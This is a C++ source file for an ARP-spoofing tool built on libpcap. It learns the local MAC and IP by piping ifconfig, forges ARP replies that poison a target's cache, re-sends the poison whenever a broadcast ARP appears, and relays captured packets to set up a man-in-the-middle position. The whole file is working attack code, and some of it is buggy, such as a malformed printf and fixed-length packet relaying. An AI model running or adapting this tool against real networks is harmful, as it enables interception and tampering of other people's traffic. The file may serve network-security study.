#include "spooftool.h"
#include <string.h>

using namespace std;


spooftool::spooftool(char *interface,char *senderip,char *receiverip)
{
    char *cmd = "ifconfig | grep ether";
    FILE *m;
    char errbuf[100];
    unsigned char buf[100],mac[50],ip[30];
    this->hPcap = pcap_open_live(interface,1000,10,1,errbuf);
    struct pcap_pkthdr *header;


    //get local mac
    m = popen(cmd,"r");
    fgets((char *)buf,99,m);
    sscanf((char *)buf,"%s%s",buf,mac);
    sscanf((char *)mac,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",requestbuf+6,requestbuf+7,requestbuf+8,requestbuf+9,requestbuf+10,requestbuf+11);
    pclose(m);

    cmd = "ifconfig | grep inet";
    m = popen(cmd,"r");
    fgets((char *)buf,99,m);
    sscanf((char *)buf,"%s%s",buf,ip);
    //set arprequest to victim
    pclose(m);

    memset(requestbuf,0xff,6);
    //ethetype
    requestbuf[12]=0x08;
    requestbuf[13]=0x06;

    //=======arp======
    //hardware type
    requestbuf[14]=0x00;
    requestbuf[15]=0x01;
    //protocol type
    requestbuf[16]=0x08;
    requestbuf[17]=0x00;
    //h/w size
    requestbuf[18]=0x06;
    //protocol sizez
    requestbuf[19]=0x04;
    //opcode
    requestbuf[20]=0x00;
    requestbuf[21]=0x01;
    //attacker mac
    memcpy(requestbuf+22,requestbuf+6,6);
    //sender ip
    sscanf((const char *)ip,"%d.%d.%d.%d",requestbuf+28,requestbuf+29,requestbuf+30,requestbuf+31);
    //receiver mac
    memset(requestbuf+32,0,6);
    //receiver ip

    sscanf(receiverip,"%d.%d.%d.%d",requestbuf+38,requestbuf+39,requestbuf+40,requestbuf+41);
    //set arpreply


    const u_char *ubuf;
    int res;
    while(1)
    {
        pcap_sendpacket(hPcap,(const u_char *)requestbuf,54);
        res = pcap_next_ex( hPcap , &header , &ubuf );
        if(res == 0)
            continue;

        if(res == -1 || res == -2)
            break;


        if(ubuf[12]==0x08 && ubuf[13] == 0x06 && ubuf[20]==0  && ubuf[21]==2)
        {
            //ubuf[22],ubuf[23],ubuf[24],ubuf[25],ubuf[26],ubuf[27]
            memcpy(responsebuf,requestbuf,100);
            memcpy(responsebuf,ubuf+22,6);
            //arp header
            responsebuf[20]=0x00;
            responsebuf[21]=0x02;
            sscanf((const char *)senderip,"%d.%d.%d.%d",responsebuf+28,responsebuf+29,responsebuf+30,responsebuf+31);
            memcpy(responsebuf+32,responsebuf,6);
            break;


        }
    }
}


void spooftool::keep_spoofing()
{

    struct pcap_pkthdr *header;
    const u_char *ubuf;
    int cmpsrc=0,cmptarget=0;
    u_char broad[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},senderip[4];

    printf("instance start : ",this->hPcap);

    memcpy(senderip,responsebuf+28,4);
    printf("constructor");
    //initial spoofing
    pcap_sendpacket(hPcap,(const u_char *)responsebuf,54);
    pcap_sendpacket(hPcap,(const u_char *)responsebuf,54);
    pcap_sendpacket(hPcap,(const u_char *)responsebuf,54);
    pcap_sendpacket(hPcap,(const u_char *)responsebuf,54);
    //receive and prevent arp unicast
    int res;
    while(1)
    {

        res = pcap_next_ex( hPcap , &header , &ubuf );
        if(res == 0)
            continue;

        if(res == -1 || res == -2)
            break;
        if(memcmp(broad,ubuf,6) == 0 && memcmp(senderip,ubuf+28,4))
        {
            pcap_sendpacket(hPcap,(const u_char *)responsebuf,54);
        }
    }



    //detect and poisoning
}


void spooftool::packet_relay()
{
    int res;
    const u_char *ubuf;
    struct pcap_pkthdr *header;


    while(1)
    {
         pcap_next_ex(hPcap,&header,&ubuf);
         pcap_sendpacket(hPcap,ubuf,1024);
    }





}
